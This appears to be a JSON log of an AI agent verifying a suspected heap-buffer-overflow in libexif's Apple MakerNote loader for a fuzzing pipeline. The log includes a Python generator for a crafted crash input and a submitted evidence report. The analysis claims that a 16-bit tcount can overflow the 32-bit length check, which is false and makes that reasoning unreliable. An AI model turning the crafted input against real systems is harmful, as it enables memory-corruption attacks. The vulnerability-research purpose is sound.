@@ -1,0 +1,181 @@
+{
+  "tag": "ex-delta-01__exif-004",
+  "gt": "exif_mnote_data_apple_load",
+  "crash_type": "heap-buffer-overflow",
+  "tools_used": [
+    "read_function",
+    "check_reachability",
+    "reach_probe",
+    "submit_evidence"
+  ],
+  "evidence": {
+    "sanitizer_compatible": true,
+    "input_reaches_operand": true,
+    "guard_clamps": "none",
+    "pattern_present": true,
+    "reasoning": "Read exif_mnote_data_apple_load. It reads tcount from buf+ofs+14 and checks `if (buf_size < 6 + 16 + tcount * 6 + 4) return;` using 32-bit unsigned arithmetic; for large tcount this expression can overflow and become small, bypassing the length check. It then allocates `sizeof(MnoteAppleEntry)*tcount` and iterates i<tcount reading 12 bytes per entry from `buf+ofs` without verifying `ofs+12 <= buf_size` per-iteration. For each entry it computes `dsize = exif_format_get_size(format) * components` (also can overflow) and chooses `dofs` either from an offset field or inline. The only bounds check is `if (dofs > buf_size) continue;` which is off-by-one (allows dofs==buf_size) and does not ensure `dofs + dsize <= buf_size`. Then it does `memcpy(entry->data, buf + dofs, dsize)` which can read past end of `buf` (heap-buffer-overflow read under ASan) when dofs is within buf but dofs+dsize exceeds buf_size. This is directly controllable by input fields (format/components/offset). I attempted to run reach_probe but the ASan binary path was missing in the environment, so no runtime crash proof was obtained.",
+    "corrected_description": "Heap-buffer-overflow (OOB read) in exif_mnote_data_apple_load: insufficient bounds checking before `memcpy(entry->data, buf + dofs, dsize)`. The pre-check `buf_size < 6+16+tcount*6+4` can integer-overflow for large tcount, and there is no check that `dofs + dsize <= buf_size` (plus `dofs > buf_size` is off-by-one). Additionally `dsize` computation can overflow.",
+    "control_flow_to_bug": "exif_loader_fuzzer -> EXIF parsing -> MakerNote dispatch -> exif_mnote_data_apple_load(md, buf, buf_size): require buf_size>=22, byte order bytes at buf[d->offset+6+12..13] are 'II' or 'MM'; tcount read from buf+ofs+14; length check `buf_size < 6+16+tcount*6+4` must pass (can be bypassed via overflow). Then loop over entries: attacker controls format/components and offset/value to set dsize>0 and dofs within [0,buf_size]; since only `dofs > buf_size` is checked and no `dofs+dsize` check, memcpy reads past end when dofs+dsize>buf_size."
+  },
+  "dynamic": {
+    "any_reach": false,
+    "any_crash": false,
+    "probes": []
+  },
+  "score": 0.65,
+  "verdict": "LIKELY",
+  "basis": "unclamped tainted (no dynamic margin)",
+  "trajectory": [
+    {
+      "iter": 0,
+      "tool": "read_function",
+      "args": {
+        "name": "exif_mnote_data_apple_load"
+      },
+      "result": "exif_mnote_data_apple_load(ExifMnoteData *md, const unsigned char *buf, unsigned int buf_size) {\n    ExifMnoteDataApple *d = (ExifMnoteDataApple *) md;\n    unsigned int tcount, i;\n    unsigned int dsize;\n    unsigned int ofs, dofs;\n\n                                     \n\n    if (!d || !buf || (buf_size < 6 + 16)) {\n        exif_log(md->log, EXIF_LOG_CODE_CORRUPT_DATA,\n                 \"ExifMnoteDataApple\", \"Short MakerNote\");\n        return;\n    }\n\n                                   \n    ofs = d->offset + 6;\n\n    if ((buf[ofs + 12] == 'M') && (buf[ofs + 13] == 'M')) {\n        d->order = EXIF_BYTE_ORDER_MOTOROLA;\n    } else if ((buf[ofs + 12] == 'I') && (buf[ofs + 13] == 'I')) {\n        d->order = EXIF_BYTE_ORDER_INTEL;\n    } else {\n        exif_log(md->log, EXIF_LOG_CODE_CORRUPT_DATA,\n                \"ExifMnoteDataApple\", \"Unrecognized byte order\");\n                                                       \n        return;\n    }\n\n    tcount = (unsigned int) exif_get_short(buf + ofs + 14, d->order);\n\n                                 \n    if (buf_size < 6 + 16 + tcount * 6 + 4) {\n        exif_log(md->log, EXIF_LOG_CODE_CORRUPT_DATA,\n                 \"ExifMnoteDataApple\", \"Short MakerNote\");\n                                                       \n        return;\n    }\n\n                                                                            \n\n    ofs += 16;\n\n    exif_mnote_data_apple_free(md);\n\n                                                                  \n    d->entries = exif_mem_alloc(md->mem, sizeof(MnoteAppleEntry) * tcount);\n    if (!d->entries) {\n        EXIF_LOG_NO_MEMORY(md->log, \"ExifMnoteApple\", sizeof(MnoteAppleEntry) * tcount);\n                                                       \n        return;\n    }\n\n    for (i = 0; i < tcount; i++) {\n        d->entries[i].tag = exif_get_short(buf + ofs, d->order);\n        d->entries[i].format = exif_get_short(buf + ofs + 2, d->order);\n        d->entries[i].components = exif_get_long(buf + ofs + 4, d->order);\n        d->entries[i].order = d->order;\n        dsize = exif_format_get_size(d->entries[i].format) * d->entries[i].components;\n        if (dsize > 4) {\n            dofs = d->offset + exif_get_long(buf + ofs + 8, d->order);\n        } else {\n            dofs = ofs + 8;\n        }\n\tif (dofs > buf_size) {\n\t\texif_log (md->log, EXIF_LOG_CODE_CORRUPT_DATA,\n                                  \"ExifMnoteApplet\", \"Tag size overflow detected (%u vs size %u)\", dofs, buf_size);\n\t\tcontinue;\n\t}\n        ofs += 12;\n        d->entries[i].data = exif_mem_alloc(md->mem, dsize);\n        if (!d->entries[i].data) {\n            EXIF_LOG_NO_MEMORY(md->log, \"ExifMnoteApple\", dsize);\n            continue;\n        }\n        memcpy(d->entries[i].data, buf + dofs, dsize);\n        d->entries[i].size = dsize;\n    }\n    d->count = tcount;\n\n    return;\n}"
+    },
+    {
+      "iter": 0,
+      "tool": "check_reachability",
+      "args": {
+        "function_name": "exif_mnote_data_apple_load"
+      },
+      "result": "{\"reachable\": true, \"call_depth\": 5, \"reached_via\": \"indirect\", \"n_callers\": 2}"
+    },
+    {
+      "iter": 1,
+      "tool": "reach_probe",
+      "args": {
+        "generator_code": "def generate()->bytes:\n    # Minimal EXIF-like blob to reach exif_mnote_data_apple_load and trigger OOB read.\n    # We rely on fuzzer harness parsing; craft MakerNote with Apple header and 1 entry.\n    # Layout expected by function:\n    # buf_size >= 22; ofs = d->offset+6; then reads buf[ofs+12..13] and short at ofs+14.\n    # We'll assume d->offset==0 in harness (common for MakerNote loaders).\n    # Put byte order 'II' at buf[18..19], tcount=1 at buf[20..21].\n    # Then entry table starts at ofs+16 = 22.\n    # Entry: tag(2), format(2), components(4), value/offset(4).\n    # Choose format=1 (BYTE), components=0x100 so dsize=256 (>4) and dofs = offset + value.\n    # Set value=0x30 so dofs=0x30 within buf_size check, but provide buffer shorter than dofs+dsize.\n    b = bytearray(0x40)  # 64 bytes total\n    # place 'II'\n    b[18]=ord('I'); b[19]=ord('I')\n    # tcount=1 little-endian\n    b[20]=1; b[21]=0\n    # entry at 22\n    ofs=22\n    # tag\n    b[ofs:ofs+2]=(1).to_bytes(2,'little')\n    # format=1\n    b[ofs+2:ofs+4]=(1).to_bytes(2,'little')\n    # components=0x100\n    b[ofs+4:ofs+8]=(0x100).to_bytes(4,'little')\n    # value/offset=0x30\n    b[ofs+8:ofs+12]=(0x30).to_bytes(4,'little')\n    return bytes(b)\n",
+        "target": "exif_mnote_data_apple_load"
+      },
+      "result": "{\"error\": \"[Errno 2] No such file or directory: '/home/ze/fb-graphs/build/ex-delta-01/bugs/exif-004/bin/address'\"}"
+    },
+    {
+      "iter": 2,
+      "tool": "submit_evidence",
+      "args": {
+        "sanitizer_compatible": true,
+        "input_reaches_operand": true,
+        "guard_clamps": "none",
+        "pattern_present": true,
+        "reasoning": "Read exif_mnote_data_apple_load. It reads tcount from buf+ofs+14 and checks `if (buf_size < 6 + 16 + tcount * 6 + 4) return;` using 32-bit unsigned arithmetic; for large tcount this expression can overflow and become small, bypassing the length check. It then allocates `sizeof(MnoteAppleEntry)*tcount` and iterates i<tcount reading 12 bytes per entry from `buf+ofs` without verifying `ofs+12 <= buf_size` per-iteration. For each entry it computes `dsize = exif_format_get_size(format) * components` (also can overflow) and chooses `dofs` either from an offset field or inline. The only bounds check is `if (dofs > buf_size) continue;` which is off-by-one (allows dofs==buf_size) and does not ensure `dofs + dsize <= buf_size`. Then it does `memcpy(entry->data, buf + dofs, dsize)` which can read past end of `buf` (heap-buffer-overflow read under ASan) when dofs is within buf but dofs+dsize exceeds buf_size. This is directly controllable by input fields (format/components/offset). I attempted to run reach_probe but the ASan binary path was missing in the environment, so no runtime crash proof was obtained.",
+        "corrected_description": "Heap-buffer-overflow (OOB read) in exif_mnote_data_apple_load: insufficient bounds checking before `memcpy(entry->data, buf + dofs, dsize)`. The pre-check `buf_size < 6+16+tcount*6+4` can integer-overflow for large tcount, and there is no check that `dofs + dsize <= buf_size` (plus `dofs > buf_size` is off-by-one). Additionally `dsize` computation can overflow.",
+        "control_flow_to_bug": "exif_loader_fuzzer -> EXIF parsing -> MakerNote dispatch -> exif_mnote_data_apple_load(md, buf, buf_size): require buf_size>=22, byte order bytes at buf[d->offset+6+12..13] are 'II' or 'MM'; tcount read from buf+ofs+14; length check `buf_size < 6+16+tcount*6+4` must pass (can be bypassed via overflow). Then loop over entries: attacker controls format/components and offset/value to set dsize>0 and dofs within [0,buf_size]; since only `dofs > buf_size` is checked and no `dofs+dsize` check, memcpy reads past end when dofs+dsize>buf_size."
+      },
+      "result": "{\"received\": true}"
+    }
+  ],
+  "token_log": [
+    {
+      "iter": 0,
+      "model": "gpt-5.2",
+      "input_tokens": 1116,
+      "output_tokens": 64,
+      "total_tokens": 1180,
+      "latency_ms": 1393
+    },
+    {
+      "iter": 1,
+      "model": "gpt-5.2",
+      "input_tokens": 2074,
+      "output_tokens": 472,
+      "total_tokens": 2546,
+      "latency_ms": 5877
+    },
+    {
+      "iter": 2,
+      "model": "gpt-5.2",
+      "input_tokens": 2596,
+      "output_tokens": 608,
+      "total_tokens": 3204,
+      "latency_ms": 8170
+    }
+  ],
+  "token_totals": {
+    "input": 5786,
+    "output": 1144,
+    "total": 6930,
+    "llm_calls": 3
+  },
+  "full_messages": [
+    {
+      "role": "system",
+      "content": "You are a vulnerability verifier. All candidate functions are already\nreachable from the fuzzer — do NOT re-litigate reachability as pass/fail. Your job\nis to gather EVIDENCE about whether the reached code actually contains a\ncrashing memory-safety bug of the stated type, then submit it.\n\nGather evidence with the tools:\n- read_function(name): read the real source.\n- check_reachability(function_name): confirm the call graph (depth, direct/indirect).\n- reach_probe(generator_code, target): write Python `def generate()->bytes` that\n  produces an input aiming to REACH `target` (a function name or \"file.c:LINE\").\n  It runs the input on the real ASan binary under gdb and tells you whether the\n  target was reached and whether it crashed. A crash is proof; a reach grounds\n  your judgment. Only a real crash or reach can raise the score above the ceiling —\n  you cannot assert a high score from reading alone.\n- submit_evidence(...): report your structured findings (see its schema). Call it\n  once, last.\n\nTwo of the fields are NOT about scoring — they correct the SP for the downstream\nPoV stage, and you are the right one to write them because you just read the real\ncode (and maybe ran a reach_probe):\n- corrected_description: if the SP's stated bug type/description is wrong or\n  imprecise given the real code, write the accurate one (else restate it).\n- control_flow_to_bug: the real path from the fuzzer entry to the crash site — the\n  key functions, branches, and conditions that must hold to trigger it.\n\nDo NOT pass things \"when in doubt\". Report what the evidence shows. Absence of a\ncrash is not proof of safety; a proven clamp/guard on the tainted value IS\ndisconfirming."
+    },
+    {
+      "role": "user",
+      "content": "Verify this suspicious point.\n\nFuzzer: exif_loader_fuzzer   Sanitizer: address\nFunction: exif_mnote_data_apple_load\nClaimed bug type: heap-buffer-overflow\nSuspicious-point description (from the finder — may be imprecise): `tcount = exif_get_short(buf+ofs+14)` is used in the bound `buf_size < 6+16+tcount*6+4`, which integer-overflows for large tcount and bypasses the check; the loop then reads `buf+ofs`/`buf+dofs` and `memcpy(entry->data, buf+dofs, dsize)` with dsize = format_size*components past the buffer end. `dofs > buf_size` uses `>` (off-by-one) and dsize isn't re-checked against remaining bytes.\n\nControl flow to the bug:\n  - Apple MakerNote loaded; tcount read from buf\n  - buf_size < 6+16+tcount*6+4 integer-overflows -> check bypassed\n  - per-entry dofs/dsize from data; memcpy(entry->data, buf+dofs, dsize) reads past buf end\n\nThe function is reachable (confirm with check_reachability if useful).\n\nRead the function, judge whether a fuzzer input can drive a heap-buffer-overflow\nthere, optionally reach_probe a candidate input to ground it, then submit_evidence."
+    },
+    {
+      "role": "assistant",
+      "content": "",
+      "tool_calls": [
+        {
+          "id": "call_BnaRfAwerRE9ktzCso86vv2W",
+          "type": "function",
+          "function": {
+            "name": "read_function",
+            "arguments": "{\"name\": \"exif_mnote_data_apple_load\"}"
+          }
+        },
+        {
+          "id": "call_7Hue6L7jHoRitzK7e9ooBBEb",
+          "type": "function",
+          "function": {
+            "name": "check_reachability",
+            "arguments": "{\"function_name\": \"exif_mnote_data_apple_load\"}"
+          }
+        }
+      ]
+    },
+    {
+      "role": "tool",
+      "tool_call_id": "call_BnaRfAwerRE9ktzCso86vv2W",
+      "content": "exif_mnote_data_apple_load(ExifMnoteData *md, const unsigned char *buf, unsigned int buf_size) {\n    ExifMnoteDataApple *d = (ExifMnoteDataApple *) md;\n    unsigned int tcount, i;\n    unsigned int dsize;\n    unsigned int ofs, dofs;\n\n                                     \n\n    if (!d || !buf || (buf_size < 6 + 16)) {\n        exif_log(md->log, EXIF_LOG_CODE_CORRUPT_DATA,\n                 \"ExifMnoteDataApple\", \"Short MakerNote\");\n        return;\n    }\n\n                                   \n    ofs = d->offset + 6;\n\n    if ((buf[ofs + 12] == 'M') && (buf[ofs + 13] == 'M')) {\n        d->order = EXIF_BYTE_ORDER_MOTOROLA;\n    } else if ((buf[ofs + 12] == 'I') && (buf[ofs + 13] == 'I')) {\n        d->order = EXIF_BYTE_ORDER_INTEL;\n    } else {\n        exif_log(md->log, EXIF_LOG_CODE_CORRUPT_DATA,\n                \"ExifMnoteDataApple\", \"Unrecognized byte order\");\n                                                       \n        return;\n    }\n\n    tcount = (unsigned int) exif_get_short(buf + ofs + 14, d->order);\n\n                                 \n    if (buf_size < 6 + 16 + tcount * 6 + 4) {\n        exif_log(md->log, EXIF_LOG_CODE_CORRUPT_DATA,\n                 \"ExifMnoteDataApple\", \"Short MakerNote\");\n                                                       \n        return;\n    }\n\n                                                                            \n\n    ofs += 16;\n\n    exif_mnote_data_apple_free(md);\n\n                                                                  \n    d->entries = exif_mem_alloc(md->mem, sizeof(MnoteAppleEntry) * tcount);\n    if (!d->entries) {\n        EXIF_LOG_NO_MEMORY(md->log, \"ExifMnoteApple\", sizeof(MnoteAppleEntry) * tcount);\n                                                       \n        return;\n    }\n\n    for (i = 0; i < tcount; i++) {\n        d->entries[i].tag = exif_get_short(buf + ofs, d->order);\n        d->entries[i].format = exif_get_short(buf + ofs + 2, d->order);\n        d->entries[i].components = exif_get_long(buf + ofs + 4, d->order);\n        d->entries[i].order = d->order;\n        dsize = exif_format_get_size(d->entries[i].format) * d->entries[i].components;\n        if (dsize > 4) {\n            dofs = d->offset + exif_get_long(buf + ofs + 8, d->order);\n        } else {\n            dofs = ofs + 8;\n        }\n\tif (dofs > buf_size) {\n\t\texif_log (md->log, EXIF_LOG_CODE_CORRUPT_DATA,\n                                  \"ExifMnoteApplet\", \"Tag size overflow detected (%u vs size %u)\", dofs, buf_size);\n\t\tcontinue;\n\t}\n        ofs += 12;\n        d->entries[i].data = exif_mem_alloc(md->mem, dsize);\n        if (!d->entries[i].data) {\n            EXIF_LOG_NO_MEMORY(md->log, \"ExifMnoteApple\", dsize);\n            continue;\n        }\n        memcpy(d->entries[i].data, buf + dofs, dsize);\n        d->entries[i].size = dsize;\n    }\n    d->count = tcount;\n\n    return;\n}"
+    },
+    {
+      "role": "tool",
+      "tool_call_id": "call_7Hue6L7jHoRitzK7e9ooBBEb",
+      "content": "{\"reachable\": true, \"call_depth\": 5, \"reached_via\": \"indirect\", \"n_callers\": 2}"
+    },
+    {
+      "role": "assistant",
+      "content": "",
+      "tool_calls": [
+        {
+          "id": "call_upam3QdDNa06uFSecdgwQaLw",
+          "type": "function",
+          "function": {
+            "name": "reach_probe",
+            "arguments": "{\"generator_code\":\"def generate()->bytes:\\n    # Minimal EXIF-like blob to reach exif_mnote_data_apple_load and trigger OOB read.\\n    # We rely on fuzzer harness parsing; craft MakerNote with Apple header and 1 entry.\\n    # Layout expected by function:\\n    # buf_size >= 22; ofs = d->offset+6; then reads buf[ofs+12..13] and short at ofs+14.\\n    # We'll assume d->offset==0 in harness (common for MakerNote loaders).\\n    # Put byte order 'II' at buf[18..19], tcount=1 at buf[20..21].\\n    # Then entry table starts at ofs+16 = 22.\\n    # Entry: tag(2), format(2), components(4), value/offset(4).\\n    # Choose format=1 (BYTE), components=0x100 so dsize=256 (>4) and dofs = offset + value.\\n    # Set value=0x30 so dofs=0x30 within buf_size check, but provide buffer shorter than dofs+dsize.\\n    b = bytearray(0x40)  # 64 bytes total\\n    # place 'II'\\n    b[18]=ord('I'); b[19]=ord('I')\\n    # tcount=1 little-endian\\n    b[20]=1; b[21]=0\\n    # entry at 22\\n    ofs=22\\n    # tag\\n    b[ofs:ofs+2]=(1).to_bytes(2,'little')\\n    # format=1\\n    b[ofs+2:ofs+4]=(1).to_bytes(2,'little')\\n    # components=0x100\\n    b[ofs+4:ofs+8]=(0x100).to_bytes(4,'little')\\n    # value/offset=0x30\\n    b[ofs+8:ofs+12]=(0x30).to_bytes(4,'little')\\n    return bytes(b)\\n\",\"target\":\"exif_mnote_data_apple_load\"}"
+          }
+        }
+      ]
+    },
+    {
+      "role": "tool",
+      "tool_call_id": "call_upam3QdDNa06uFSecdgwQaLw",
+      "content": "{\"error\": \"[Errno 2] No such file or directory: '/home/ze/fb-graphs/build/ex-delta-01/bugs/exif-004/bin/address'\"}"
+    },
+    {
+      "role": "assistant",
+      "content": "",
+      "tool_calls": [
+        {
+          "id": "call_Lfdm83jeebb6vrTbdMXlg0NF",
+          "type": "function",
+          "function": {
+            "name": "submit_evidence",
+            "arguments": "{\"sanitizer_compatible\":true,\"input_reaches_operand\":true,\"guard_clamps\":\"none\",\"pattern_present\":true,\"reasoning\":\"Read exif_mnote_data_apple_load. It reads tcount from buf+ofs+14 and checks `if (buf_size < 6 + 16 + tcount * 6 + 4) return;` using 32-bit unsigned arithmetic; for large tcount this expression can overflow and become small, bypassing the length check. It then allocates `sizeof(MnoteAppleEntry)*tcount` and iterates i<tcount reading 12 bytes per entry from `buf+ofs` without verifying `ofs+12 <= buf_size` per-iteration. For each entry it computes `dsize = exif_format_get_size(format) * components` (also can overflow) and chooses `dofs` either from an offset field or inline. The only bounds check is `if (dofs > buf_size) continue;` which is off-by-one (allows dofs==buf_size) and does not ensure `dofs + dsize <= buf_size`. Then it does `memcpy(entry->data, buf + dofs, dsize)` which can read past end of `buf` (heap-buffer-overflow read under ASan) when dofs is within buf but dofs+dsize exceeds buf_size. This is directly controllable by input fields (format/components/offset). I attempted to run reach_probe but the ASan binary path was missing in the environment, so no runtime crash proof was obtained.\" ,\"corrected_description\":\"Heap-buffer-overflow (OOB read) in exif_mnote_data_apple_load: insufficient bounds checking before `memcpy(entry->data, buf + dofs, dsize)`. The pre-check `buf_size < 6+16+tcount*6+4` can integer-overflow for large tcount, and there is no check that `dofs + dsize <= buf_size` (plus `dofs > buf_size` is off-by-one). Additionally `dsize` computation can overflow.\" ,\"control_flow_to_bug\":\"exif_loader_fuzzer -> EXIF parsing -> MakerNote dispatch -> exif_mnote_data_apple_load(md, buf, buf_size): require buf_size>=22, byte order bytes at buf[d->offset+6+12..13] are 'II' or 'MM'; tcount read from buf+ofs+14; length check `buf_size < 6+16+tcount*6+4` must pass (can be bypassed via overflow). Then loop over entries: attacker controls format/components and offset/value to set dsize>0 and dofs within [0,buf_size]; since only `dofs > buf_size` is checked and no `dofs+dsize` check, memcpy reads past end when dofs+dsize>buf_size.\"}"
+          }
+        }
+      ]
+    },
+    {
+      "role": "tool",
+      "tool_call_id": "call_Lfdm83jeebb6vrTbdMXlg0NF",
+      "content": "{\"received\": true}"
+    }
+  ]
+}
